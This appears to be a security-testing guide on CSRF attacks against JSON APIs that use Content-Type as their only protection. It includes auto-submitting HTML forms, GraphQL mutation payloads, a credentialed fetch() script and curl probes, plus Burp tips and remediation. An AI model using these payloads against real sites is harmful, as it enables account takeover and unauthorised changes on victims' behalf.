# CSRF via JSON Body / Content-Type Bypass

## Overview
Modern APIs often accept JSON request bodies (`Content-Type: application/json`) for state-changing operations. Many developers incorrectly assume that JSON-based endpoints are immune to CSRF because HTML forms cannot natively send `application/json` content type — a browser's `<form>` element can only produce `application/x-www-form-urlencoded`, `multipart/form-data`, or `text/plain`. However, attackers can bypass this restriction using several techniques: sending the JSON payload as `text/plain` (a "simple" content type that does not trigger CORS pre-flight), exploiting endpoints that accept both JSON and form-encoded data, or using the `fetch()` API when a CORS vulnerability is present. The mere use of JSON does not provide CSRF protection.

## How It Works
When a browser submits a cross-origin form, it can only use content types that are considered "simple" (not triggering CORS pre-flight): `application/x-www-form-urlencoded`, `multipart/form-data`, or `text/plain`. If the target API accepts JSON but also accepts `text/plain`, an attacker can craft a form that sends a `text/plain` body that the server still parses as JSON (if the server ignores the Content-Type and parses the body anyway). Alternatively, some servers accept form-encoded parameters alongside or instead of JSON. If SameSite cookies are not set, this is exploitable without any CORS involvement.

## Impact
- CSRF exploitation of JSON-only APIs that lack SameSite protection
- State changes on endpoints developers believed were protected by Content-Type
- Account changes, fund transfers, configuration changes via REST API CSRF

## Where to Look
- REST API endpoints accepting POST/PUT/PATCH/DELETE with `application/json`
- Single-page application backends where all state changes go through JSON APIs
- Endpoints that switch behavior based on `Content-Type` (accept both JSON and form-encoded)
- GraphQL endpoints (JSON bodies are sent to a single endpoint)
- APIs that do not require any CSRF token and rely on `Content-Type` as protection
- Any API endpoint without SameSite cookie protection and without CSRF tokens

## Testing Steps
1. Identify a state-changing JSON API endpoint (POST with `Content-Type: application/json`).
2. Confirm the endpoint lacks a CSRF token.
3. Test if the endpoint accepts the same body with `Content-Type: text/plain` (remove the CORS pre-flight).
4. Test if the endpoint accepts `Content-Type: application/x-www-form-urlencoded` with the same parameters.
5. Test if the body can be wrapped in a way that looks like form data but is parsed as JSON (e.g., using the JSON key as a field name trick).
6. Build a CSRF PoC using a form with `enctype="text/plain"` that sends a body the server parses as JSON.
7. Test with CORS misconfiguration — if the origin is reflected, use `fetch()` with `credentials: include` and any Content-Type.
8. For GraphQL: test if the query can be sent as a form-encoded parameter (`query=...`).

## Payloads / Techniques

**Test: Does the API accept text/plain?**
```bash
curl -X POST https://victim.com/api/user/update \
     -H 'Cookie: session=abc123' \
     -H 'Content-Type: text/plain' \
     -d '{"email":"attacker@evil.com"}'
```

**CSRF PoC using form enctype=text/plain:**
The body of `enctype="text/plain"` forms is formatted as `name=value\r\nname2=value2`. The trick is to construct a form where the name of the first input is valid JSON prefix and the value contains the rest:

```html
<!DOCTYPE html>
<html>
<body>
<form id="csrf" method="POST" 
      action="https://victim.com/api/user/update"
      enctype="text/plain">
  <!-- 
    The browser sends: {"email":"attacker@evil.com"}=ignored
    If the server ignores the trailing "=ignored" and parses as JSON, this works
  -->
  <input type="hidden" name='{"email":"attacker@evil.com","x":"' value='"}'>
</form>
<script>document.getElementById('csrf').submit();</script>
</body>
</html>
```

The server receives:
```
{"email":"attacker@evil.com","x":"="}
```
If the server strips or ignores trailing garbage after the JSON object, it parses successfully.

**Test: Does the API accept form-encoded parameters instead of JSON?**
```bash
curl -X POST https://victim.com/api/user/update \
     -H 'Cookie: session=abc123' \
     -H 'Content-Type: application/x-www-form-urlencoded' \
     -d 'email=attacker@evil.com'
```

**CSRF PoC if form-encoded is accepted (standard form):**
```html
<form method="POST" action="https://victim.com/api/user/update">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit();</script>
```

**GraphQL CSRF — query as URL parameter (GET):**
```html
<img src="https://victim.com/graphql?query=mutation{deleteAccount(id:42){success}}">
```

**GraphQL CSRF — form submission:**
```html
<form method="POST" action="https://victim.com/graphql">
  <input type="hidden" name="query" value="mutation{updateEmail(email:&quot;attacker@evil.com&quot;){id}}">
</form>
<script>document.forms[0].submit();</script>
```

**Fetch with any Content-Type (only works with CORS misconfiguration):**
```html
<script>
fetch('https://victim.com/api/user/update', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({email: 'attacker@evil.com'})
})
.then(r => r.text())
.then(t => console.log(t));
</script>
```

**cURL matrix test — try all Content-Types:**
```bash
for ct in "application/json" "text/plain" "application/x-www-form-urlencoded" "multipart/form-data"; do
  echo "Testing: $ct"
  curl -s -o /dev/null -w "%{http_code}" \
       -X POST https://victim.com/api/user/update \
       -H "Cookie: session=abc123" \
       -H "Content-Type: $ct" \
       -d '{"email":"test@test.com"}'
  echo ""
done
```

**Multipart CSRF with JSON payload:**
```html
<form method="POST" action="https://victim.com/api/update" enctype="multipart/form-data">
  <input type="hidden" name="data" value='{"email":"attacker@evil.com"}'>
</form>
<script>document.forms[0].submit();</script>
```

## Burp Suite Tips
- In **Repeater**, change the `Content-Type` from `application/json` to `text/plain` and observe if the server still processes the request.
- Use **Burp's "Generate CSRF PoC"** feature (right-click a JSON POST request) — it automatically attempts to craft a `text/plain` form PoC.
- Test multiple Content-Type values in **Intruder** using a Content-Type wordlist to find which ones the server accepts.
- For GraphQL, check the **GraphQL Raider** or **InQL** Burp extension to automatically enumerate mutations and test them for CSRF.
- Inspect response codes carefully in Repeater — a 400 "Bad JSON" vs. 403 "CSRF error" tells you whether the server even tries to parse your payload.
- Use **Burp's browser** to test the PoC form interactively — some Content-Type tricks only work when initiated by a real browser form submission.

## Tools
- Burp Suite Pro (CSRF PoC Generator, Repeater, InQL extension for GraphQL)
- InQL — https://github.com/doyensec/inql (GraphQL security scanner)
- GraphQL Voyager (for API structure exploration)
- curl (for Content-Type matrix testing)
- XSRFProbe — https://github.com/0xInfection/XSRFProbe
- OWASP ZAP

## Remediation
- **Validate Content-Type strictly**: Only accept requests with `Content-Type: application/json` for JSON endpoints. Reject `text/plain`, `application/x-www-form-urlencoded`, and other types with a 415 Unsupported Media Type response.
- **Do not rely on Content-Type as the only CSRF protection**: A CORS misconfiguration or future browser behavior change could undermine it. Always combine with a CSRF token.
- **Add CSRF tokens to JSON APIs**: Include a CSRF token in the JSON body (`{"csrf_token": "...", "email": "..."}`) or as a custom header (`X-CSRF-Token`).
- **SameSite=Strict for session cookies**: The most effective mitigation — if the session cookie is never sent cross-origin, no CSRF is possible regardless of Content-Type.
- **Custom request headers**: Require a custom non-standard header (e.g., `X-Requested-With: XMLHttpRequest`) on all API requests. This header cannot be set by a cross-origin form and triggers CORS pre-flight, which your server should reject for non-allowed origins.
- **CORS configuration**: Configure CORS strictly — only allow known trusted origins. If `null` origin is not needed, reject it explicitly.

## References
https://portswigger.net/web-security/csrf
https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
https://portswigger.net/research/exploiting-csrf-via-json
https://owasp.org/www-community/attacks/csrf
https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests
